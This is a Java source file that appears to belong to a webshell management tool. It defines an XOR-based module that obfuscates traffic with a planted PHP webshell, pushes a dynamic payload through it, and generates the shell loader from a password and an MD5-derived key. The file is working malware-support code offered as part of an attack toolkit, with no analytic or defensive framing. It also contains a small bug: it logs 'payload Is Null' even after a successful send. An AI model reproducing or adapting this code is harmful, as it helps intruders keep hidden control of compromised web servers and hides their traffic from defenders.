package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "PHP_XOR_RAW", payloadName = "PhpDynamicPayload")
public class PhpXorRaw implements Cryption {
    private Http http;
    private byte[] key;
    private byte[] payload;
    private ShellEntity shell;
    private boolean state;

    @Override 
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        try {
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            }
            Log.error("payload Is Null");
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public byte[] encode(byte[] data) {
        try {
            return E(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public byte[] decode(byte[] data) {
        if (data == null || data.length <= 0) {
            return data;
        }
        try {
            return D(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override 
    public boolean isSendRLData() {
        return false;
    }

    public byte[] E(byte[] cs) {
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[(i + 1) & 15]);
        }
        return cs;
    }

    public byte[] D(byte[] cs) {
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[(i + 1) & 15]);
        }
        return cs;
    }

    @Override 
    public boolean check() {
        return this.state;
    }

    @Override 
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
    }
}
